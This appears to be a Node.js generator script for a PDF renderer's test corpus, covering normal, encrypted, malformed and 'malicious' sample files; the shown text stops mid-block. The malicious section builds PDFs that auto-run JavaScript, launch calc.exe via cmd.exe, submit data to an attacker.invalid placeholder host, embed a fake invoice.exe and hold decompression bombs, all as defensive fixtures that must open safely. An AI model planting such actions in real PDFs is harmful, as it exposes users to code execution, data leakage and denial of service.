#!/usr/bin/env node
// Generates the phinPDF test corpus: small PDFs written byte-by-byte so each edge case is
// exact and every file is our own work (Apache-2.0). Encrypted, linearized and
// object-stream variants are produced with qpdf using static IDs so output is reproducible.
//
// Usage: node test-corpus/generate.mjs        (requires qpdf on PATH)
// Output: test-corpus/files/<category>/<name>.pdf and test-corpus/manifest.json
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { deflateSync } from 'node:zlib';

const ROOT = dirname(fileURLToPath(import.meta.url));
const OUT = join(ROOT, 'files');

// ---------------------------------------------------------------------------
// Minimal PDF writer
// ---------------------------------------------------------------------------
const enc = (s) => Buffer.from(s, 'latin1');
const pdfString = (s) => `(${s.replace(/[\\()]/g, (c) => `\\${c}`)})`;

class PdfWriter {
  constructor(version = '1.7') {
    this.version = version;
    this.objects = []; // index = object number - 1; value = Buffer
  }

  /** Reserve an object number to fill in later (for forward references). */
  reserve() {
    this.objects.push(null);
    return this.objects.length;
  }

  set(num, body) {
    this.objects[num - 1] = Buffer.isBuffer(body) ? body : enc(body);
    return num;
  }

  add(body) {
    return this.set(this.reserve(), body);
  }

  /** Adds a stream object. `dict` is the dictionary body without << >> or /Length. */
  stream(data, dict = '', { compress = false, length } = {}) {
    let bytes = Buffer.isBuffer(data) ? data : enc(data);
    let filter = '';
    if (compress) {
      bytes = deflateSync(bytes);
      filter = ' /Filter /FlateDecode';
    }
    const len = length ?? bytes.length;
    return this.add(
      Buffer.concat([
        enc(`<< ${dict}${filter} /Length ${len} >>\nstream\n`),
        bytes,
        enc('\nendstream'),
      ]),
    );
  }

  /**
   * Serializes the document. `root` and `info` are object numbers.
   * Options exist so malformed variants can be produced from correct files.
   */
  toBuffer({
    root,
    info,
    trailerExtra = '',
    prefix = Buffer.alloc(0),
    xref = 'table',
    eof = true,
  } = {}) {
    const parts = [prefix, enc(`%PDF-${this.version}\n%\xE2\xE3\xCF\xD3\n`)];
    let offset = parts.reduce((n, b) => n + b.length, 0);
    const offsets = [];
    this.objects.forEach((body, i) => {
      if (!body) throw new Error(`object ${i + 1} was reserved but never set`);
      offsets.push(offset);
      const chunk = Buffer.concat([enc(`${i + 1} 0 obj\n`), body, enc('\nendobj\n')]);
      parts.push(chunk);
      offset += chunk.length;
    });
    const xrefOffset = offset;
    if (xref !== 'none') {
      const shift = xref === 'shifted' ? 7 : 0;
      const rows = offsets.map((o) => `${String(o + shift).padStart(10, '0')} 00000 n \n`).join('');
      parts.push(enc(`xref\n0 ${this.objects.length + 1}\n0000000000 65535 f \n${rows}`));
    }
    const infoRef = info ? ` /Info ${info} 0 R` : '';
    parts.push(
      enc(
        `trailer\n<< /Size ${this.objects.length + 1} /Root ${root} 0 R${infoRef}${trailerExtra} >>\n` +
          `startxref\n${xref === 'none' ? 0 : xrefOffset}\n${eof ? '%%EOF\n' : ''}`,
      ),
    );
    return Buffer.concat(parts);
  }
}

// ---------------------------------------------------------------------------
// Document builders
// ---------------------------------------------------------------------------
const LOREM =
  'phinPDF test corpus. The quick brown fox jumps over the lazy dog. 0123456789 ' +
  'Lorem ipsum dolor sit amet, consectetur adipiscing elit.';

function textContent(pageNo, lines = 40, font = 'F1') {
  const body = [`BT /${font} 18 Tf 72 740 Td ${pdfString(`Page ${pageNo}`)} Tj ET`];
  for (let i = 0; i < lines; i++) {
    body.push(`BT /${font} 10 Tf 72 ${710 - i * 15} Td ${pdfString(`${i + 1}. ${LOREM}`)} Tj ET`);
  }
  return body.join('\n');
}

/**
 * Builds a simple document. `pages` is an array of page specs:
 * { content?, mediaBox?, rotate?, extra?, annots?, resources? }
 */
function buildDoc({
  version = '1.7',
  pages = [{}],
  catalogExtra = '',
  pagesExtra = '',
  info = null,
  setup = null,
  compress = false,
} = {}) {
  const w = new PdfWriter(version);
  const catalog = w.reserve();
  const pagesNode = w.reserve();
  const font = w.add(
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>',
  );
  const ctx = { w, catalog, pagesNode, font, pageRefs: [] };
  const extras = setup ? setup(ctx) : {};
  const kids = pages.map((spec, i) => {
    const page = w.reserve();
    ctx.pageRefs.push(page);
    return { page, spec, i };
  });
  for (const { page, spec, i } of kids) {
    const content =
      spec.contentRef ??
      w.stream(
        typeof spec.content === 'function'
          ? spec.content(ctx)
          : (spec.content ?? textContent(i + 1)),
        '',
        {
          compress,
        },
      );
    const contents = Array.isArray(content)
      ? `[${content.map((c) => `${c} 0 R`).join(' ')}]`
      : `${content} 0 R`;
    const resources = spec.resources ?? `<< /Font << /F1 ${font} 0 R >> >>`;
    const annots = typeof spec.annots === 'function' ? spec.annots(ctx, page) : spec.annots;
    w.set(
      page,
      `<< /Type /Page /Parent ${pagesNode} 0 R` +
        (spec.mediaBox === null
          ? ''
          : ` /MediaBox [${(spec.mediaBox ?? [0, 0, 612, 792]).join(' ')}]`) +
        (resources ? ` /Resources ${resources}` : '') +
        ` /Contents ${contents}` +
        (spec.rotate ? ` /Rotate ${spec.rotate}` : '') +
        (annots ? ` /Annots ${annots}` : '') +
        (spec.extra ?? '') +
        ' >>',
    );
  }
  w.set(
    pagesNode,
    `<< /Type /Pages /Kids [${kids.map((k) => `${k.page} 0 R`).join(' ')}] /Count ${pages.length}${pagesExtra} >>`,
  );
  w.set(
    catalog,
    `<< /Type /Catalog /Pages ${pagesNode} 0 R${catalogExtra}${extras.catalogExtra ?? ''} >>`,
  );
  const infoRef = info ? w.add(info) : undefined;
  return { w, root: catalog, info: infoRef, ctx };
}

const save = (doc, opts = {}) => doc.w.toBuffer({ root: doc.root, info: doc.info, ...opts });
const nPages = (n, spec = {}) => Array.from({ length: n }, () => ({ ...spec }));

function rgbImage(w, h) {
  const px = Buffer.alloc(w * h * 3);
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const i = (y * w + x) * 3;
      px[i] = Math.round((x / (w - 1)) * 255);
      px[i + 1] = Math.round((y / (h - 1)) * 255);
      px[i + 2] = 160;
    }
  }
  return px;
}

// ---------------------------------------------------------------------------
// qpdf helpers (static IDs/IVs keep output reproducible)
// ---------------------------------------------------------------------------
function qpdf(input, args) {
  const dir = mkdtempSync(join(tmpdir(), 'phinpdf-corpus-'));
  const tmpIn = join(dir, 'in.pdf');
  const tmpOut = join(dir, 'out.pdf');
  writeFileSync(tmpIn, input);
  try {
    execFileSync('qpdf', ['--static-id', '--static-aes-iv', ...args, tmpIn, tmpOut], {
      stdio: 'pipe',
    });
  } catch (e) {
    // Exit code 3 means "succeeded with warnings".
    if (e.status !== 3) throw new Error(`qpdf failed: ${e.stderr}`, { cause: e });
  }
  const out = readFileSync(tmpOut);
  rmSync(dir, { recursive: true });
  return out;
}

const encrypt = (input, user, owner, bits, extra = []) =>
  qpdf(input, ['--allow-weak-crypto', '--encrypt', user, owner, String(bits), ...extra, '--']);

// ---------------------------------------------------------------------------
// Corpus entries
// ---------------------------------------------------------------------------
// expect.opens: true (with expect.pages), or the renderer OpenError code.
const entries = [];
const add = (category, name, description, bytes, expect) =>
  entries.push({ category, name, description, bytes, expect });

const base10 = save(buildDoc({ pages: nPages(10) }));

// --- normal -----------------------------------------------------------------
add('normal', 'text-1page', 'One page of Helvetica text.', save(buildDoc()), {
  opens: true,
  pages: 1,
});
add('normal', 'text-10pages', 'Ten pages of text.', base10, { opens: true, pages: 10 });
{
  const doc = buildDoc({
    setup(ctx) {
      const names = [
        'Helvetica',
        'Helvetica-Bold',
        'Helvetica-Oblique',
        'Helvetica-BoldOblique',
        'Times-Roman',
        'Times-Bold',
        'Times-Italic',
        'Times-BoldItalic',
        'Courier',
        'Courier-Bold',
        'Courier-Oblique',
        'Courier-BoldOblique',
        'Symbol',
        'ZapfDingbats',
      ];
      ctx.fonts = names.map((n) => [
        n,
        ctx.w.add(`<< /Type /Font /Subtype /Type1 /BaseFont /${n} >>`),
      ]);
      ctx.fontRes = `<< /Font << ${ctx.fonts.map(([, ref], i) => `/S${i} ${ref} 0 R`).join(' ')} >> >>`;
      return {};
    },
    pages: [{}],
  });
  // Rewrite the single page with all fonts.
  const { w, ctx } = doc;
  const content = w.stream(
    ctx.fonts
      .map(
        ([n], i) => `BT /S${i} 14 Tf 72 ${740 - i * 40} Td ${pdfString(`${n}: Hello 123`)} Tj ET`,
      )
      .join('\n'),
  );
  w.set(
    ctx.pageRefs[0],
    `<< /Type /Page /Parent ${ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources ${ctx.fontRes} /Contents ${content} 0 R >>`,
  );
  add('normal', 'standard-fonts', 'All 14 standard Type 1 fonts (not embedded).', save(doc), {
    opens: true,
    pages: 1,
  });
}
add(
  'normal',
  'vector-graphics',
  'Filled and stroked paths, Bézier curves, dashes, and colours.',
  save(
    buildDoc({
      pages: [
        {
          content:
            '1 0 0 rg 72 600 200 100 re f\n0 0 1 RG 4 w 320 600 200 100 re S\n' +
            '0 0.6 0 rg 72 400 m 150 550 250 250 330 400 c f\n[6 3] 0 d 0 g 2 w 72 300 m 540 300 l S\n' +
            '0.5 g 400 350 m 470 450 l 540 350 l h B',
        },
      ],
    }),
  ),
  { opens: true, pages: 1 },
);
{
  const doc = buildDoc({
    setup(ctx) {
      ctx.img = ctx.w.stream(
        rgbImage(64, 64),
        '/Type /XObject /Subtype /Image /Width 64 /Height 64 /ColorSpace /DeviceRGB /BitsPerComponent 8',
        { compress: true },
      );
      return {};
    },
    pages: [{ resources: undefined }],
  });
  const { w, ctx } = doc;
  const content = w.stream('q 300 0 0 300 156 400 cm /Im1 Do Q');
  w.set(
    ctx.pageRefs[0],
    `<< /Type /Page /Parent ${ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 ${ctx.img} 0 R >> >> /Contents ${content} 0 R >>`,
  );
  add('normal', 'image-rgb', 'A Flate-compressed 64x64 RGB image.', save(doc), {
    opens: true,
    pages: 1,
  });
}
{
  const doc = buildDoc();
  const { w, ctx } = doc;
  const gray = Buffer.alloc(32 * 32, 0).map((_, i) => (i % 32) * 8);
  const mask = Buffer.alloc(32 * 32, 0).map((_, i) => (Math.floor(i / 32) % 2 ? 255 : 64));
  const smask = w.stream(
    mask,
    '/Type /XObject /Subtype /Image /Width 32 /Height 32 /ColorSpace /DeviceGray /BitsPerComponent 8',
    { compress: true },
  );
  const img = w.stream(
    gray,
    `/Type /XObject /Subtype /Image /Width 32 /Height 32 /ColorSpace /DeviceGray /BitsPerComponent 8 /SMask ${smask} 0 R`,
    { compress: true },
  );
  const content = w.stream('q 200 0 0 200 206 400 cm /Im1 Do Q');
  w.set(
    ctx.pageRefs[0],
    `<< /Type /Page /Parent ${ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 ${img} 0 R >> >> /Contents ${content} 0 R >>`,
  );
  add('normal', 'image-gray-smask', 'Greyscale image with a soft mask (transparency).', save(doc), {
    opens: true,
    pages: 1,
  });
}
{
  const doc = buildDoc({ pages: nPages(3) });
  const { w, ctx } = doc;
  const outlines = w.reserve();
  const [a, b, c] = [w.reserve(), w.reserve(), w.reserve()];
  w.set(
    a,
    `<< /Title (Chapter 1) /Parent ${outlines} 0 R /Next ${b} 0 R /Dest [${ctx.pageRefs[0]} 0 R /Fit] >>`,
  );
  w.set(
    b,
    `<< /Title (Chapter 2) /Parent ${outlines} 0 R /Prev ${a} 0 R /First ${c} 0 R /Last ${c} 0 R /Count 1 /Dest [${ctx.pageRefs[1]} 0 R /Fit] >>`,
  );
  w.set(
    c,
    `<< /Title (Section 2.1) /Parent ${b} 0 R /Dest [${ctx.pageRefs[2]} 0 R /XYZ 72 400 0] >>`,
  );
  w.set(outlines, `<< /Type /Outlines /First ${a} 0 R /Last ${b} 0 R /Count 3 >>`);
  w.set(
    doc.root,
    `<< /Type /Catalog /Pages ${ctx.pagesNode} 0 R /Outlines ${outlines} 0 R /PageMode /UseOutlines >>`,
  );
  add('normal', 'outline', 'Nested bookmarks (outline) pointing at pages.', save(doc), {
    opens: true,
    pages: 3,
  });
}
add(
  'normal',
  'links',
  'An internal link to page 2 and an external https link.',
  save(
    buildDoc({
      pages: [
        {
          annots: (ctx) =>
            `[<< /Type /Annot /Subtype /Link /Rect [72 700 300 720] /Border [0 0 1] /Dest [${ctx.pageRefs[1]} 0 R /Fit] >> ` +
            '<< /Type /Annot /Subtype /Link /Rect [72 670 300 690] /Border [0 0 1] /A << /S /URI /URI (https://example.com/) >> >>]',
        },
        {},
      ],
    }),
  ),
  { opens: true, pages: 2 },
);
add(
  'normal',
  'annotations',
  'Existing sticky note, highlight with appearance, square, and ink annotations.',
  save(
    buildDoc({
      pages: [
        {
          annots: (ctx) => {
            const ap = ctx.w.stream(
              '1 1 0 rg 72 700 200 20 re f',
              '/Type /XObject /Subtype /Form /BBox [72 700 272 720]',
            );
            return (
              '[<< /Type /Annot /Subtype /Text /Rect [20 750 40 770] /Contents (A note) /Name /Comment /C [1 0.8 0] >> ' +
              `<< /Type /Annot /Subtype /Highlight /Rect [72 700 272 720] /QuadPoints [72 720 272 720 72 700 272 700] /C [1 1 0] /AP << /N ${ap} 0 R >> >> ` +
              '<< /Type /Annot /Subtype /Square /Rect [300 500 400 600] /C [0 0 1] /BS << /W 2 >> >> ' +
              '<< /Type /Annot /Subtype /Ink /Rect [100 300 300 400] /InkList [[100 300 150 400 200 300 250 400 300 300]] /C [1 0 0] /BS << /W 3 >> >>]'
            );
          },
        },
      ],
    }),
  ),
  { opens: true, pages: 1 },
);
{
  const doc = buildDoc();
  const { w, ctx } = doc;
  const page = ctx.pageRefs[0];
  const helv = w.add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const name = w.add(
    `<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /Rect [150 650 450 674] /P ${page} 0 R /DA (/Helv 12 Tf 0 g) /F 4 /MK << /BC [0 0 0] >> >>`,
  );
  const agree = w.add(
    `<< /Type /Annot /Subtype /Widget /FT /Btn /T (agree) /V /Off /AS /Off /Rect [150 600 168 618] /P ${page} 0 R /F 4 /MK << /BC [0 0 0] /CA (4) >> >>`,
  );
  const radioParent = w.reserve();
  const r1 = w.add(
    `<< /Type /Annot /Subtype /Widget /Parent ${radioParent} 0 R /Rect [150 550 166 566] /P ${page} 0 R /AS /Off /F 4 /MK << /BC [0 0 0] >> /AP << /N << /a null >> >> >>`,
  );
  const r2 = w.add(
    `<< /Type /Annot /Subtype /Widget /Parent ${radioParent} 0 R /Rect [200 550 216 566] /P ${page} 0 R /AS /Off /F 4 /MK << /BC [0 0 0] >> /AP << /N << /b null >> >> >>`,
  );
  w.set(radioParent, `<< /FT /Btn /Ff 49152 /T (choice) /V /Off /Kids [${r1} 0 R ${r2} 0 R] >>`);
  const combo = w.add(
    `<< /Type /Annot /Subtype /Widget /FT /Ch /Ff 131072 /T (country) /Opt [(Canada) (Ireland) (Japan)] /Rect [150 500 350 520] /P ${page} 0 R /DA (/Helv 12 Tf 0 g) /F 4 /MK << /BC [0 0 0] >> >>`,
  );
  const content = w.stream(
    'BT /F1 12 Tf 72 655 Td (Name:) Tj 0 -50 Td (I agree:) Tj 0 -50 Td (Choice:) Tj 0 -50 Td (Country:) Tj ET',
  );
  w.set(
    page,
    `<< /Type /Page /Parent ${ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${ctx.font} 0 R >> >> /Contents ${content} 0 R /Annots [${name} 0 R ${agree} 0 R ${r1} 0 R ${r2} 0 R ${combo} 0 R] >>`,
  );
  w.set(
    doc.root,
    `<< /Type /Catalog /Pages ${ctx.pagesNode} 0 R /AcroForm << /Fields [${name} 0 R ${agree} 0 R ${radioParent} 0 R ${combo} 0 R] /NeedAppearances true /DR << /Font << /Helv ${helv} 0 R >> >> /DA (/Helv 12 Tf 0 g) >> >>`,
  );
  add(
    'normal',
    'acroform',
    'AcroForm with text, checkbox, radio group, and combo box fields.',
    save(doc),
    { opens: true, pages: 1 },
  );
}
add(
  'normal',
  'page-labels',
  'Page labels: i, ii, then 1, 2, 3.',
  save(
    buildDoc({
      pages: nPages(5),
      catalogExtra: ' /PageLabels << /Nums [0 << /S /r >> 2 << /S /D >>] >>',
    }),
  ),
  { opens: true, pages: 5 },
);
{
  const xmp =
    '<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/">' +
    '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" ' +
    'xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title><rdf:Alt><rdf:li xml:lang="x-default">Metadata test</rdf:li>' +
    '</rdf:Alt></dc:title></rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>';
  const doc = buildDoc({
    info: '<< /Title (Metadata test) /Author (phinPDF) /Subject (Corpus) /Keywords (test, metadata) /Creator (generate.mjs) >>',
  });
  const meta = doc.w.stream(xmp, '/Type /Metadata /Subtype /XML');
  doc.w.set(doc.root, `<< /Type /Catalog /Pages ${doc.ctx.pagesNode} 0 R /Metadata ${meta} 0 R >>`);
  add('normal', 'metadata', 'Info dictionary and XMP metadata.', save(doc), {
    opens: true,
    pages: 1,
  });
}
add(
  'normal',
  'large-1000pages',
  '1,000 pages of short text (performance).',
  save(buildDoc({ pages: nPages(1000, { content: undefined }), compress: true })),
  { opens: true, pages: 1000 },
);
add(
  'normal',
  'compressed-content',
  'Flate-compressed content streams.',
  save(buildDoc({ pages: nPages(3), compress: true })),
  { opens: true, pages: 3 },
);
{
  const doc = buildDoc();
  const { w, ctx } = doc;
  const c1 = w.stream('BT /F1 24 Tf 72 700 Td (Split across) Tj');
  const c2 = w.stream(' 0 -30 Td (two content streams) Tj ET');
  w.set(
    ctx.pageRefs[0],
    `<< /Type /Page /Parent ${ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${ctx.font} 0 R >> >> /Contents [${c1} 0 R ${c2} 0 R] >>`,
  );
  add(
    'normal',
    'multi-content-streams',
    'One page whose content is split across two streams.',
    save(doc),
    { opens: true, pages: 1 },
  );
}
{
  const doc = buildDoc({ pages: nPages(2, { mediaBox: null, resources: '' }) });
  const { w, ctx } = doc;
  w.set(
    ctx.pagesNode,
    `<< /Type /Pages /Kids [${ctx.pageRefs.map((p) => `${p} 0 R`).join(' ')}] /Count 2 /MediaBox [0 0 595 842] /Resources << /Font << /F1 ${ctx.font} 0 R >> >> >>`,
  );
  add(
    'normal',
    'inherited-attributes',
    'MediaBox and Resources inherited from the Pages node.',
    save(doc),
    { opens: true, pages: 2 },
  );
}
add(
  'normal',
  'tagged',
  'Tagged PDF markers (MarkInfo, Lang, minimal StructTreeRoot) for accessibility.',
  (() => {
    const doc = buildDoc();
    const st = doc.w.add('<< /Type /StructTreeRoot >>');
    doc.w.set(
      doc.root,
      `<< /Type /Catalog /Pages ${doc.ctx.pagesNode} 0 R /MarkInfo << /Marked true >> /Lang (en-US) /StructTreeRoot ${st} 0 R >>`,
    );
    return save(doc);
  })(),
  { opens: true, pages: 1 },
);

// --- versions ---------------------------------------------------------------
for (const v of ['1.3', '1.4', '1.7', '2.0']) {
  add('versions', `pdf-${v}`, `Header declares PDF ${v}.`, save(buildDoc({ version: v })), {
    opens: true,
    pages: 1,
  });
}

// --- geometry ---------------------------------------------------------------
for (const r of [90, 180, 270]) {
  add(
    'geometry',
    `rotate-${r}`,
    `Page with /Rotate ${r}.`,
    save(buildDoc({ pages: [{ rotate: r }] })),
    { opens: true, pages: 1 },
  );
}
add(
  'geometry',
  'mixed-sizes',
  'Letter, A4, landscape, and legal pages in one file.',
  save(
    buildDoc({
      pages: [
        { mediaBox: [0, 0, 612, 792] },
        { mediaBox: [0, 0, 595, 842] },
        { mediaBox: [0, 0, 792, 612] },
        { mediaBox: [0, 0, 612, 1008] },
      ],
    }),
  ),
  { opens: true, pages: 4 },
);
add(
  'geometry',
  'tiny-page',
  'A 1x1 inch page.',
  save(
    buildDoc({
      pages: [{ mediaBox: [0, 0, 72, 72], content: 'BT /F1 8 Tf 4 30 Td (tiny) Tj ET' }],
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'geometry',
  'huge-page',
  'A 200x200 inch page (the PDF maximum).',
  save(
    buildDoc({
      pages: [
        { mediaBox: [0, 0, 14400, 14400], content: 'BT /F1 400 Tf 1000 7000 Td (huge page) Tj ET' },
      ],
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'geometry',
  'cropbox',
  'CropBox smaller than MediaBox, with a non-zero origin.',
  save(buildDoc({ pages: [{ mediaBox: [0, 0, 612, 792], extra: ' /CropBox [50 50 562 742]' }] })),
  { opens: true, pages: 1 },
);
add(
  'geometry',
  'userunit',
  'PDF 1.6 /UserUnit 2 (page units are 2/72 inch).',
  save(buildDoc({ version: '1.6', pages: [{ extra: ' /UserUnit 2' }] })),
  { opens: true, pages: 1 },
);

// --- structure --------------------------------------------------------------
add(
  'structure',
  'object-streams',
  'Objects in object streams with a cross-reference stream (PDF 1.5+).',
  qpdf(base10, ['--object-streams=generate']),
  { opens: true, pages: 10 },
);
add('structure', 'linearized', 'Linearized ("fast web view").', qpdf(base10, ['--linearize']), {
  opens: true,
  pages: 10,
});
{
  // Incremental update: append a new version of page 1's content plus a new xref section.
  const doc = buildDoc({ pages: nPages(2) });
  const original = save(doc);
  const contentNum = doc.w.objects.length + 1;
  const pageNum = doc.ctx.pageRefs[0];
  const startxref = Number(/startxref\n(\d+)/.exec(original.toString('latin1'))[1]);
  const stream = 'BT /F1 24 Tf 72 700 Td (Updated by an incremental save) Tj ET';
  const newContent = `${contentNum} 0 obj\n<< /Length ${stream.length} >>\nstream\n${stream}\nendstream\nendobj\n`;
  const newPage = `${pageNum} 0 obj\n<< /Type /Page /Parent ${doc.ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${doc.ctx.font} 0 R >> >> /Contents ${contentNum} 0 R >>\nendobj\n`;
  const o1 = original.length;
  const o2 = o1 + newContent.length;
  const xrefAt = o2 + newPage.length;
  const update =
    newContent +
    newPage +
    `xref\n0 1\n0000000000 65535 f \n${pageNum} 1\n${String(o2).padStart(10, '0')} 00000 n \n${contentNum} 1\n${String(o1).padStart(10, '0')} 00000 n \n` +
    `trailer\n<< /Size ${contentNum + 1} /Root ${doc.root} 0 R /Prev ${startxref} >>\nstartxref\n${xrefAt}\n%%EOF\n`;
  add(
    'structure',
    'incremental-update',
    'Original file plus an appended incremental update that replaces page 1.',
    Buffer.concat([original, enc(update)]),
    { opens: true, pages: 2 },
  );
}

// --- encrypted --------------------------------------------------------------
const encSrc = save(buildDoc({ pages: nPages(2) }));
add(
  'encrypted',
  'rc4-40',
  'RC4 40-bit, user password "user".',
  encrypt(encSrc, 'user', 'owner', 40),
  { opens: 'password-required', password: 'user', pages: 2 },
);
add(
  'encrypted',
  'rc4-128',
  'RC4 128-bit, user password "user".',
  encrypt(encSrc, 'user', 'owner', 128, ['--use-aes=n']),
  { opens: 'password-required', password: 'user', pages: 2 },
);
add(
  'encrypted',
  'aes-128',
  'AES 128-bit, user password "user".',
  encrypt(encSrc, 'user', 'owner', 128, ['--use-aes=y']),
  { opens: 'password-required', password: 'user', pages: 2 },
);
add(
  'encrypted',
  'aes-256',
  'AES 256-bit, user password "user".',
  encrypt(encSrc, 'user', 'owner', 256),
  { opens: 'password-required', password: 'user', pages: 2 },
);
add(
  'encrypted',
  'aes-256-owner-only',
  'AES 256-bit, empty user password, printing and editing restricted.',
  encrypt(encSrc, '', 'owner', 256, ['--print=none', '--modify=none']),
  { opens: true, pages: 2 },
);
add(
  'encrypted',
  'aes-256-unicode-password',
  'AES 256-bit, user password "pässwörd".',
  encrypt(encSrc, 'pässwörd', 'owner', 256),
  { opens: 'password-required', password: 'pässwörd', pages: 2 },
);

// --- malformed --------------------------------------------------------------
const small = save(buildDoc({ pages: nPages(3) }));
add(
  'malformed',
  'truncated',
  'First 60% of a valid file.',
  small.subarray(0, Math.floor(small.length * 0.6)),
  null,
);
add(
  'malformed',
  'no-xref',
  'No cross-reference table; startxref points at 0.',
  save(buildDoc({ pages: nPages(3) }), { xref: 'none' }),
  null,
);
add(
  'malformed',
  'wrong-xref-offsets',
  'Every xref offset is off by 7 bytes.',
  save(buildDoc({ pages: nPages(3) }), { xref: 'shifted' }),
  null,
);
add('malformed', 'missing-eof', 'No %%EOF marker.', save(buildDoc(), { eof: false }), null);
add(
  'malformed',
  'junk-before-header',
  '500 bytes of junk before %PDF- (allowed by the spec within 1024 bytes).',
  save(buildDoc(), { prefix: Buffer.alloc(500, 0x41) }),
  null,
);
add(
  'malformed',
  'not-a-pdf',
  'A text file with a .pdf extension.',
  enc('This is not a PDF file.\n'),
  { opens: 'not-pdf' },
);
add('malformed', 'empty', 'Zero bytes.', Buffer.alloc(0), { opens: 'not-pdf' });
add('malformed', 'header-only', 'Just a PDF header and nothing else.', enc('%PDF-1.7\n'), null);
{
  const doc = buildDoc();
  const w = doc.w;
  const s = 'BT /F1 24 Tf 72 700 Td (Stream length is wrong) Tj ET';
  const ref = w.add(enc(`<< /Length 9999 >>\nstream\n${s}\nendstream`));
  w.set(
    doc.ctx.pageRefs[0],
    `<< /Type /Page /Parent ${doc.ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${doc.ctx.font} 0 R >> >> /Contents ${ref} 0 R >>`,
  );
  add(
    'malformed',
    'bad-stream-length',
    'Content stream declares /Length 9999 but is much shorter.',
    save(doc),
    null,
  );
}
add(
  'malformed',
  'missing-object',
  'Page contents reference an object that does not exist.',
  save(buildDoc({ pages: [{ contentRef: 999 }] })),
  null,
);
{
  const doc = buildDoc({ pages: nPages(2) });
  const { w, ctx } = doc;
  w.set(
    ctx.pagesNode,
    `<< /Type /Pages /Kids [${ctx.pageRefs[0]} 0 R ${ctx.pagesNode} 0 R] /Count 2 >>`,
  );
  add(
    'malformed',
    'cyclic-page-tree',
    'The page tree lists itself as a child (infinite loop risk).',
    save(doc),
    null,
  );
}

// --- malicious --------------------------------------------------------------
// These must open safely: no script runs, no network request, no hang.
add(
  'malicious',
  'js-openaction',
  'JavaScript OpenAction (must never run).',
  save(
    buildDoc({
      catalogExtra:
        ' /OpenAction << /S /JavaScript /JS (app.alert\\("phinPDF ran PDF JavaScript"\\)) >>',
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'malicious',
  'js-link',
  'Link annotation with a JavaScript action.',
  save(
    buildDoc({
      pages: [
        {
          annots:
            '[<< /Type /Annot /Subtype /Link /Rect [72 700 300 720] /A << /S /JavaScript /JS (app.alert\\(1\\)) >> >>]',
        },
      ],
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'malicious',
  'launch-action',
  'OpenAction that tries to launch an executable.',
  save(
    buildDoc({
      catalogExtra:
        ' /OpenAction << /S /Launch /F (calc.exe) /Win << /F (cmd.exe) /P (/c calc) >> >>',
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'malicious',
  'submitform-action',
  'Link that submits form data to a remote URL.',
  save(
    buildDoc({
      pages: [
        {
          annots:
            '[<< /Type /Annot /Subtype /Link /Rect [72 700 300 720] /A << /S /SubmitForm /F << /FS /URL /F (https://attacker.invalid/collect) >> >> >>]',
        },
      ],
    }),
  ),
  { opens: true, pages: 1 },
);
add(
  'malicious',
  'uri-openaction',
  'OpenAction that tries to open a URL automatically.',
  save(
    buildDoc({ catalogExtra: ' /OpenAction << /S /URI /URI (https://attacker.invalid/track) >>' }),
  ),
  { opens: true, pages: 1 },
);
{
  const doc = buildDoc();
  const w = doc.w;
  const ef = w.stream(
    'MZ fake executable payload',
    '/Type /EmbeddedFile /Subtype /application#2Foctet-stream',
  );
  const spec = w.add(
    `<< /Type /Filespec /F (invoice.exe) /UF (invoice.exe) /EF << /F ${ef} 0 R >> >>`,
  );
  w.set(
    doc.root,
    `<< /Type /Catalog /Pages ${doc.ctx.pagesNode} 0 R /Names << /EmbeddedFiles << /Names [(invoice.exe) ${spec} 0 R] >> >> >>`,
  );
  add(
    'malicious',
    'embedded-executable',
    'Embedded file attachment named invoice.exe.',
    save(doc),
    { opens: true, pages: 1 },
  );
}
{
  const doc = buildDoc();
  const w = doc.w;
  // Declares 100,000 x 100,000 pixels (30 GB decoded) backed by a tiny stream.
  const img = w.stream(
    deflateSync(Buffer.alloc(1024)),
    '/Type /XObject /Subtype /Image /Width 100000 /Height 100000 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode',
  );
  const content = w.stream('q 500 0 0 500 56 200 cm /Im1 Do Q');
  w.set(
    doc.ctx.pageRefs[0],
    `<< /Type /Page /Parent ${doc.ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 ${img} 0 R >> >> /Contents ${content} 0 R >>`,
  );
  add(
    'malicious',
    'image-bomb',
    'Image declares 100,000 x 100,000 pixels (decompression bomb).',
    save(doc),
    { opens: true, pages: 1 },
  );
}
{
  const doc = buildDoc();
  const w = doc.w;
  // 64 MB of spaces compresses to about 64 KB.
  const content = w.stream(
    deflateSync(Buffer.alloc(64 * 1024 * 1024, 0x20)),
    '/Filter /FlateDecode',
  );
  w.set(
    doc.ctx.pageRefs[0],
    `<< /Type /Page /Parent ${doc.ctx.pagesNode} 0 R /MediaBox [0 0 612 792] /Contents ${content} 0 R >>`,
  );
  add(
    'malicious',
    'flate-bomb',
    'Content stream that inflates from about 64 KB to 64 MB.',
    save(doc),
    { opens: true, pages: 1 },
  );
